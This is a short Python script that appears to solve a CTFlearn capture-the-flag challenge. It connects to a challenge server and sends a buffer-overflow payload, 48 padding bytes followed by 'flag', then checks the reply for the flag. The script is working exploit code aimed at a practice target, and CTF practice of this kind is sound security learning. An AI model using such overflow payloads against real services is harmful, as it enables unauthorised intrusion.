#!/usr/bin/env python3

import re
import socket

def exploit(hostname, port, payload):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((hostname, port))
  sock.sendall(payload)
  sock.shutdown(socket.SHUT_WR)
  response = b''

  while True:
    chunk = sock.recv(1024)
    if chunk == b'':
      break
    response += chunk

  sock.close()
  return response


def main():
  payload = bytes('a'*48 + 'flag', 'ascii')

  session = exploit('thekidofarcrania.com', 35235, payload)
  session = session.decode('ascii').splitlines()

  assert re.match('ctflearn{', session[-1], re.IGNORECASE)
  print(session[-1])


if __name__ == '__main__':
  main()
